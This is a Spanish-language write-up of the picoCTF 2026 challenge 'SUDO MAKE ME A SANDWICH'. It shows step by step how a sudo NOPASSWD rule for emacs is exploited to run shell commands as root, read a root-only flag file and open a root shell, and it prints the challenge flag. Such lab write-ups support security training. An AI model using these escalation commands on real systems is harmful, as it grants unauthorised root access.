# General Skills — SUDO MAKE ME A SANDWICH

## Descripción
> **Prompt oficial:** "Can you read the flag? I think you can! `ssh -p <puerto> ctf-player@<host>` using password `<pass>`"

- **Categoría:** General Skills
- **Dificultad:** Easy
- **Evento/origen:** picoCTF 2026
- **Autor:** Darkraicg492

## Solución
Clásico **GTFOBins / sudo misconfiguration**. `sudo -l` revela:

```
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```

El usuario puede ejecutar Emacs como root sin contraseña. Emacs permite ejecutar comandos de shell arbitrarios (elisp `shell-command`), lo que da una escalada de privilegios trivial a root:

```bash
ssh -p <puerto> ctf-player@<host>
sudo -l
# (ALL) NOPASSWD: /bin/emacs

# La flag está en un directorio solo-root (/challenge, modo 700)
sudo /bin/emacs -Q --batch --eval '(message (shell-command-to-string "ls -la /challenge"))'
# -> metadata.json

sudo /bin/emacs -Q --batch --eval '(message (shell-command-to-string "cat /challenge/metadata.json"))'
# -> {"flag":"picoCTF{...}", "password":"..."}
```

Flag: `picoCTF{ju57_5ud0_17_9418380d}`

## Notas adicionales
- Alternativa interactiva (sin `--batch`): `sudo emacs -Q -nw`, luego `M-x shell` abre una shell interactiva como root dentro de Emacs.
- Es exactamente la entrada de **GTFOBins** para `emacs` (https://gtfobins.github.io/gtfobins/emacs/#sudo), aplicable a cualquier binario con capacidad de ejecutar comandos de sistema que tenga permiso `sudo NOPASSWD`.
- El elisp `shell-command-to-string` ejecuta el comando y devuelve su salida como string; `message` la imprime a stdout en modo `--batch`, lo cual permite capturarla directamente sin abrir una sesión interactiva.

## Referencias
- Reto: https://learn.cylabacademy.org/library/735
- Apoyo: https://gtfobins.github.io/gtfobins/emacs/
